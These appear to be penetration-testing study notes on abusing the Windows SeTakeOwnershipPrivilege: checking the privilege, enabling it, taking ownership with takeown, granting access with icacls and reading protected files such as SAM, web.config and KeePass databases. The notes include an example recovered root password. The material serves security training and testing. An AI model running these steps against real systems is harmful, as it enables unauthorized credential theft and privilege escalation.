### **Overview**

- Grants user ability to _take ownership_ of any _securable object_:
    - Files, folders, registry keys, services, processes, printers, Active Directory objects

- Assigns _WRITE_OWNER_ rights (change owner in security descriptor)
- Default: _Administrators_ only
- Rare on standard users, but sometimes assigned to _backup service accounts_

---

### **Policy Location**

- `Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment`
- Setting: _Take ownership of files or other objects_

---

### **Abuse Scenarios**

- Escalate privileges by taking ownership of protected files
- Example files:
    - `cred.txt` in restricted directory
    - Sensitive config files (`web.config`, `SAM`, `SECURITY`, etc.)
    - KeePass databases, scripts, password files

---

### **Steps to Abuse**

**1. Check Privileges**
```powershell
whoami /priv
```
- Look for: `SeTakeOwnershipPrivilege` (state = Disabled)

**2. Enable Privilege**
```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

**3. Take Ownership of Target File**
```powershell
takeown /f "C:\Path\To\TargetFile.txt"
```

**4. Confirm New Owner**
```powershell
Get-ACL "C:\Path\To\TargetFile.txt" | Select Owner
```

**5. Modify File ACL (if access still denied)**
```powershell
icacls "C:\Path\To\TargetFile.txt" /grant youruser:F
```

**6. Read File**
```powershell
Get-Content "C:\Path\To\TargetFile.txt"
```


---

### **Example Target**
```txt
C:\Department Shares\Private\IT\cred.txt
```
- Original owner: Service account
- Final content after abuse:
```makefile
NIX01 admin
root:n1X_p0wer_us3er!
```

---

### **Risks & Precautions**

- **Potentially destructive**: may break app dependencies or disrupt services
- Avoid use on system-critical files unless authorized
- Always revert ownership/permissions after use or notify/report

---

### **Common Files to Target**

- `c:\inetpub\wwwroot\web.config`
- `%WINDIR%\repair\sam`
- `%WINDIR%\system32\config\*.sav`
- `%WINDIR%\system32\config\SecEvent.Evt`
- Sensitive user files: `*.kdbx`, `*.ps1`, `passwords.*`, `*.xml`, etc.

---

### **When to Use**

- User has `SeTakeOwnershipPrivilege`
- Misconfigured GPO allows granting it to a user (e.g., via SharpGPOAbuse)
- Need access to file with `Access Denied` but no other escalation route
